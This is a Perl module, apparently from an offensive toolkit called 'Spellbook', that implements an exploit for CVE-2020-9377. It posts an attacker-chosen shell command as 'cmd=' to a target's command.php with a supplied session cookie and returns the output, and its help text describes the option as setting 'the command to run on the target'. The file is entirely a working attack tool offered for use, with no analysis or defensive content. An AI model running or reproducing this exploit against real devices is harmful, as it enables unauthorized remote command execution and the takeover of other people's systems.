package Spellbook::Advisory::CVE_2020_9377 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $cookie, $command, @results);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target,
            "c|cookie=s" => \$cookie,
            "p|payload=s" => \$command
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//x) {
                $target = "http://$target";
            }

            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $payload   = "cmd=$command";

            my $headers   = HTTP::Headers -> new (
                "Content-Type" => "application/x-www-form-urlencoded",
                "Cookie" => "uid=$cookie"
            );

            my $request   = HTTP::Request -> new("POST", "$target/command.php", $headers, $payload);
            my $response  = $userAgent -> request($request);

            if ($response -> code() == 200) {
                push @results, $response -> content();
            }

            return @results;
        }

        if ($help) {
            return<<"EOT";

Advisory::CVE_2020_9377
=======================
-h, --help     See this menu
-t, --target   Define a target
-c, --cookie    Define a session cookie
-p, --payload  Set the command to run on the target\n\n";

EOT
        }

        return 0;
    }
}

1;
